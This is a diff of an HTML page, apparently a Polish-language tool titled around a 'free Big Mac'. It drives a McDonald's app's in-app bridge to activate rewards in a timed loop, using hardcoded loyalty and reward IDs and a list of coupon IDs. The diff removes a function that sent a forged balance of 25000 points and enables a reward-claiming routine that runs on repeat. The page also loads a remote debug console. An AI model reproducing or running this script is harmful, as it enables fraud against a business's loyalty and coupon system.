@@ -1,5 +1,3 @@
-10 lines (108 sloc)  3.56 KB
-   
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -10,11 +8,11 @@
         font-family: "Comic Sans MS", "Comic Sans";
       }
     </style>
-    <title>LOLOLOLO</title>
+    <title></title>
   </head>
   <body>
-    <h1>uwu</h1>
-    <h2><input type="checkbox" class="catboy" />i am a catboy</h2>
+    <h1>Darmowego bigmaczka?</h1>
+    <h2><input type="checkbox" class="catboy" />Lubisz chłopców?</h2>
     <a href="?ddd">ddd</a>
     <a href="?ddd2">ddd2</a>
     <a href="?corn">corn</a>
@@ -33,15 +31,30 @@
     <input type="number" class="loyalityId" value="985" />
     <script>
       let coupons = [
-        37125, 53279, 53705, 53742, 53746, 53748, 53765, 53801, 53802, 53803,
-        53804, 53805, 53806, 53807, 53808, 53809, 53810,
+        37125,
+        53279,
+        53705,
+        53742,
+        53746,
+        53748,
+        53765,
+        53801,
+        53802,
+        53803,
+        53804,
+        53805,
+        53806,
+        53807,
+        53808,
+        53809,
+        53810,
       ];
       let intid = null;
       document.querySelector(".napierdalacz").addEventListener("click", () => {
         if (intid) clearInterval(intid);
 
         intid = setInterval(() => {
-          getPoints(
+          getPrize(
             mcd.bridge,
             parseInt(document.querySelector(".loyalityId").value)
           );
@@ -57,10 +70,9 @@
           if (intid) clearInterval(intid);
         });
       document.addEventListener("mcdBridgeReady", function (e) {
+	    
         console.log(mcd.bridge);
         let offerActivation = mcd.bridge.message("offerActivation");
-        let Instance = mcd.bridge.message("Instance");
-        let PointsRequest = mcd.bridge.message("PointsRequest");
         let deals = mcd.bridge.message("deals");
         let user = mcd.bridge.message("user");
         user.send({ promptlogin: true });
@@ -72,47 +84,18 @@
         user.on("error", function (error) {});
         user.on("done", function () {});
       });
-      function getPoints(bridge, loyalityId) {
-        let pointValue = bridge.message("pointValue");
-        let offers = bridge.message("offers");
-        offers.send({
-          getPointsRequested: true,
-        });
-        pointValue.send({
-          loyaltyId: 2400,
-          pointsBalance: 25000,
-        });
-        pointValue.on("data", function (data) {
-          console.log("offer activation data", loyalityId, data);
-        });
-        pointValue.on("error", function (error) {
-          console.warn("MCD ERROR", loyalityId, JSON.stringify(error));
-        });
-        pointValue.on("done", function () {
-          console.log("punkty dodane", pointsBalance, loyalityId);
-        });
-         offers.on("data", function (data) {
-          console.log("offers data", loyalityId, data);
-        });
-        offers.on("error", function (error) {
-          console.warn("offers MCD ERROR", loyalityId, JSON.stringify(error));
-        });
-        offers.on("done", function () {
-          console.log("punkty dodane", loyalityId);
-        });
-    }
-      <!-- function getPrize(bridge, loyalityId) {
+      function getPrize(bridge, loyalityId) {
         let couponId =
           coupons[Math.floor(Math.random() * coupons.length) + 1 - 1];
-        let offerActivation = bridge.message("offerActivation");
-        let offers = bridge.message("offers");
-        offers.send({
-          getRedeemedOffers: true,
+        let offerActivation = bridge.message("offerActivation") 
+        let offers = bridge.message("offers") 
+          offers.send({
+            getRedeemedOffers: true
         });
         offerActivation.send({
-          loyaltyId: 2400,
-          autoActivate: false,
-          rewardId: 97983,
+             loyaltyId: 2400,
+              autoActivate: false,
+              rewardId: 97983
         });
         offerActivation.on("data", function (data) {
           console.log("offer activation data", loyalityId, data);
@@ -133,7 +116,7 @@
         offers.on("done", function () {
           console.log("offers done 22", loyalityId);
         });
-      } -->
+      }
     </script>
     <script src="//cdn.jsdelivr.net/npm/eruda"></script>
     <script>
